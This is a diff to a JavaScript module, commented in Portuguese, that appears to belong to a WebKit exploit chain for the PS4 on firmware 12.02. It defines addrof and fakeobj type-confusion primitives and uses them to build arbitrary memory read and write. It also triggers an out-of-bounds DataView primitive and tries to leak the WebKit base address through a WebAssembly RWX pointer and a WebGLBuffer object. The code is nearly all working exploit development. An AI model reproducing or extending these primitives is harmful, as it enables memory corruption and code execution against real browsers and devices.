@@ -1,10 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v113 - R73 com Alocação Pioneira e Tentativa WebGL)
+// js/script3/testArrayBufferVictimCrash.mjs (v114 - R74 - Fix de Escopo addrof)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Implementa as recomendações da análise de proteções de heap do PS4 12.02.
-// - Alocação Pioneira de WebAssembly: tenta alocar WASM antes da poluição L/E.
-// - Ajuste na decodificação de ponteiros para lidar com o Pointer Tagging.
-// - Nova tentativa de vazamento via WebGL para bypass de Heap Partitioning.
+// Corrigido o erro de escopo 'addrof is not defined' movendo a definição das primitivas
+// addrof e fakeobj para o início da função principal, garantindo sua disponibilidade.
+// O foco principal continua sendo o vazamento de endereço base do WebKit via instância de WebAssembly.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -16,7 +15,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v113_R73_PioneerWebGL";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v114_R74_AddrofScopeFix";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -36,10 +35,7 @@ function doubleToInt64(double) {
 }
 
 // --- Funções de Decodificação de Ponteiros (Ajustada para a Análise do PS4) ---
-// A análise sugere que a tag de tipo está no high-word e o restante é offset.
-// Ponteiros WASM válidos podem ter tags 0x00-0x0F.
-// Ponteiros de objetos JS comuns têm tag 0x40.
-// O PS4_HEAP_BASE é um offset de base geral.
+const PS4_HEAP_BASE = AdvancedInt64.fromParts(0x20000000, 0); 
 
 function decodePS4Pointer(encoded_adv_int64) {
     if (!isAdvancedInt64Object(encoded_adv_int64)) {
@@ -52,47 +48,24 @@ function decodePS4Pointer(encoded_adv_int64) {
     const typeTag = (high_word & 0xFF000000) >>> 24; // Extrai a tag de tipo
     const address_high_part = (high_word & 0x00FFFFFF); // Remove a tag da parte alta
 
-    // Reconstrói o endereço base + offset.
-    // Esta lógica assume que a tag está *no* ponteiro e precisa ser removida,
-    // e que o endereço resultante deve ser somado a uma base conhecida (PS4_HEAP_BASE).
-    // O mais provável é que a tag seja para validação e o endereço já seja virtualmente mapeado.
-    // Para simplificar e testar a hipótese de "tag de tipo", vamos reconstruir o ponteiro sem a tag.
-    // Se a tag é != 0 e != 0x40 e > 0x0F, pode ser um ponteiro inválido ou de outro tipo.
-
     logS3(`    [decodePS4Pointer] Original: ${encoded_adv_int64.toString(true)}, Tag: ${toHex(typeTag)}, High_part: ${toHex(address_high_part)}`, "debug");
 
-    // Condição da análise: "Ponteiros WASM válidos geralmente têm tags 0x00-0x0F"
-    // Isso é para o caso de o ponteiro *ser* um ponteiro RAW de uma partição específica.
-    // Se ele tem o padrão de um ponteiro virtual de 64 bits (como os que o addrof já retorna),
-    // a tag pode ser apenas um bit de hardening.
-    // A lógica original `encoded.high() & 0x00FFFFFF` removeria a tag.
-
-    // Vamos tentar uma decodificação simples: remover a tag e ver se o endereço se torna válido.
-    // Se a tag não é uma das esperadas para ponteiros válidos (0x00-0x0F ou 0x40),
-    // pode ser um dado corrompido ou outro tipo de tag.
-    
-    // Considerando o padrão `0x402abd70_a3d70a4d` que vimos, onde `0x40` é a parte superior do high word.
-    // Se a tag é 0x40 para objetos JS, e a instância WASM também é um objeto JS, então a tag 0x40 é esperada.
-    // A análise sugere que se `typeTag > 0x0F`, talvez não seja um ponteiro bruto WASM.
-
-    // Tentativa 1: Remover apenas a tag e retornar o ponteiro.
-    const decoded_no_tag = new AdvancedInt64(low_word, address_high_part);
-    logS3(`    [decodePS4Pointer] Decodificado (removendo tag): ${decoded_no_tag.toString(true)}`, "debug");
-
-    // Se o ponteiro decodificado (sem a tag de tipo) ainda parece inválido, ele pode ser corrompido
-    // ou pertencer a outra partição que não se encaixa na decodificação simples.
-    // A análise da tag "0x000000de" no log anterior para `0xdeadbeef_cafebabe` (onde `0xde` é a tag)
-    // indica que `0xdeadbeef_cafebabe` é o valor que está na memória. A decodificação só funciona se o valor
-    // na memória FOR um ponteiro válido com tag. Se é seu lixo, ele não terá uma tag real.
-    if (encoded_adv_int64.equals(NEW_POLLUTION_VALUE)) {
+    if (encoded_adv_int64.equals(NEW_POLLUTION_VALUE)) { // 'NEW_POLLUTION_VALUE' deve ser acessível aqui
         logS3(`    [decodePS4Pointer] Valor de poluição detectado. Retornando como está (não é um ponteiro para decodificar).`, "warn");
         return encoded_adv_int64; // Não é um ponteiro para decodificar, é o valor de poluição
     }
     
-    // Retornamos o ponteiro sem a tag. A sanidade será verificada depois.
-    // A adição da PS4_HEAP_BASE só faria sentido se o `encoded` fosse um offset puro.
-    // Como `addrof` já retorna endereços como `0x402a...`, vamos tentar apenas remover a tag.
-    return decoded_no_tag;
+    // Tentativa: Se a tag for 0x40, ou se o ponteiro parece ser de uma região de heap conhecida do PS4 (0x2a, etc.)
+    // Vamos tentar remover a tag e ver se o restante parece válido.
+    // A análise sugere que 0x40 é para objetos JS. Ponteiros WASM podem ter outras tags ou ser brutos.
+    // Se o ponteiro já for um endereço virtual alto (como 0x4xxxxxxx_xxxxxxxx), não decodificaríamos com a base do heap,
+    // apenas removeríamos a tag se houvesse uma.
+    // Com base nos logs anteriores onde o `addrof` do WASM retornou 0x402a..., vamos assumir que o `encoded_adv_int64`
+    // já é o endereço virtual e a tag está nos bits mais significativos.
+    // Então, basta remover a tag.
+    
+    // Reconstruímos o ponteiro sem a tag.
+    return new AdvancedInt64(low_word, address_high_part);
 }
 
 
@@ -110,6 +83,24 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     };
 
     const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF); // Valor de poluição
+
+    // --- DEFINIÇÃO DE ADDROF/FAKEOBJ AQUI (Escopo Global da Função) ---
+    // Moved these definitions here to ensure they are available to all phases.
+    const confused_array = [13.37];
+    const victim_array = [{ a: 1 }];
+    const addrof = (obj) => {
+        victim_array[0] = obj;
+        const addr = doubleToInt64(confused_array[0]);
+        logS3(`  addrof(${String(obj).substring(0, 50)}...) -> ${addr.toString(true)}`, "debug");
+        return addr;
+    };
+    const fakeobj = (addr) => {
+        confused_array[0] = int64ToDouble(addr);
+        const obj = victim_array[0];
+        logS3(`  fakeobj(${addr.toString(true)}) -> Object`, "debug");
+        return obj;
+    };
+    // -------------------------------------------------------------------
 
     try {
         // --- FASE 1: Alocação Pioneira de WebAssembly (Antes da Poluição de L/E) ---
@@ -170,52 +161,41 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             throw new Error(`Falha na alocação Pioneira de WebAssembly: ${wasm_e.message}`);
         }
         
-        // --- FASE 2: Obtenção de Primitivas OOB e addrof/fakeobj ---
-        // A primitiva OOB continua funcionando normalmente, e addrof/fakeobj são necessários para L/E.
-        logS3("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
+        // --- FASE 2: Obtenção de Primitivas OOB ---
+        logS3("--- FASE 2: Obtendo primitivas OOB... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
         if (!getOOBDataView()) {
             throw new Error("Falha ao obter primitiva OOB.");
         }
         logS3("OOB DataView obtido com sucesso.", "info");
 
-        const confused_array = [13.37];
-        const victim_array = [{ a: 1 }];
-        const addrof_local = (obj) => { // Renomeado para evitar conflito com 'addrof' global, se aplicável
-            victim_array[0] = obj;
-            const addr = doubleToInt64(confused_array[0]);
-            return addr;
-        };
-        const fakeobj_local = (addr) => { // Renomeado
-            confused_array[0] = int64ToDouble(addr);
-            const obj = victim_array[0];
-            return obj;
-        };
-        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");
-
         // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
         const leaker = { obj_prop: null, val_prop: 0 };
-        const leaker_addr = addrof_local(leaker); // Usar local
+        const leaker_addr = addrof(leaker); // Usar global addrof
         
         const arb_read_final = (addr) => {
-            leaker.obj_prop = fakeobj_local(addr); // Usar local
+            logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
+            leaker.obj_prop = fakeobj(addr); // Usar global fakeobj
             const result = doubleToInt64(leaker.val_prop);
+            logS3(`    arb_read_final: Lido ${result.toString(true)} de ${addr.toString(true)}`, "debug");
             return result;
         };
         const arb_write_final = (addr, value) => {
-            leaker.obj_prop = fakeobj_local(addr); // Usar local
+            logS3(`    arb_write_final: Preparando para escrever ${value.toString(true)} em ${addr.toString(true)}`, "debug");
+            leaker.obj_prop = fakeobj(addr); // Usar global fakeobj
             leaker.val_prop = int64ToDouble(value);
+            logS3(`    arb_write_final: Escrita concluída em ${addr.toString(true)}`, "debug");
         };
         logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");
 
 
-        // --- FASE 4: Verificação Funcional de L/E e Poluição Intencional ---
-        logS3("--- FASE 4: Verificação Funcional de L/E e Poluição Intencional ---", "subtest");
+        // --- FASE 4: Verificação Funcional de L/E e Poluição Intencional em Região Segura ---
+        logS3("--- FASE 4: Verificação Funcional de L/E e Poluição Intencional em Região Segura ---", "subtest");
         
         // Poluição de uma região de heap separada para o teste de L/E
         const safe_test_region_array = new Array(100); // Cria um array em uma região separada
-        const safe_test_region_addr = addrof_local(safe_test_region_array);
+        const safe_test_region_addr = addrof(safe_test_region_array); // Usar global addrof
         logS3(`  Endereço da região segura para teste L/E: ${safe_test_region_addr.toString(true)}`, "info");
         
         // Escreve o valor de poluição na região segura para teste L/E
@@ -237,7 +217,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT via WebAssembly ---
         logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT VIA WEBASSAMBLY ---", "subtest");
         
-        // O `wasm_instance_addr` já foi obtido na FASE 1.
+        // O `wasm_instance_addr` já foi obtido na FASE 1 (Alocação Pioneira).
         try {
             // Vazar o ponteiro RWX do código WASM
             // A análise sugere offset 0x38 da instância para o rwxPtr.
@@ -258,6 +238,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 throw new Error("Ponteiro RWX decodificado é NaN.");
             }
             // A região RWX deve estar em um espaço de endereçamento alto, alinhado.
+            // A sua análise sugere que ponteiros WASM válidos podem ter tags 0x00-0x0F,
+            // e que 0x40 é para objetos JS comuns.
+            // O high-word de um endereço de código no PS4 geralmente é elevado.
             const is_sane_rwx_ptr = rwx_ptr_decoded.high() > 0x40000000 && (rwx_ptr_decoded.low() & 0xFFF) === 0;
             logS3(`  Verificação de Sanidade do Ponteiro RWX: Alto > 0x40000000 e alinhado a 0x1000? ${is_sane_rwx_ptr}`, is_sane_rwx_ptr ? "good" : "warn");
 
@@ -314,7 +297,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             // Para maximizar a chance de vazamento de ponteiro, podemos tentar um tamanho maior ou variação.
             gl.bufferData(gl.ARRAY_BUFFER, 0x10000, gl.STATIC_DRAW); // Alocar um buffer maior
             
-            const gl_buffer_addr = addrof_local(buffer); // Obter o addrof do objeto JS do buffer WebGL
+            const gl_buffer_addr = addrof(buffer); // Obter o addrof do objeto JS do buffer WebGL
             logS3(`  Endereço do objeto WebGLBuffer (JS): ${gl_buffer_addr.toString(true)}`, "info");
 
             if (gl_buffer_addr.low() === 0 && gl_buffer_addr.high() === 0) {
@@ -323,6 +306,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             if (gl_buffer_addr.high() === 0x7ff80000 && gl_buffer_addr.low() === 0) {
                 throw new Error("Addrof para WebGLBuffer é NaN.");
             }
+            // Verificar poluição para o endereço do WebGLBuffer (antes de ler offsets)
+            if (gl_buffer_addr.equals(NEW_POLLUTION_VALUE)) {
+                logS3(`    ALERTA DE POLUIÇÃO: Endereço do WebGLBuffer (${gl_buffer_addr.toString(true)}) está lendo o valor de poluição.`, "warn");
+                throw new Error("Endereço do WebGLBuffer poluído.");
+            }
+
             // A instância WebGLBuffer (objeto JS) também deve ter uma Structure e pode ter ponteiros.
             // Para vazar a base do WebKit, precisamos de um ponteiro para código.
             // A análise sugere que a WebGL pode "forçar exposição de metadados".
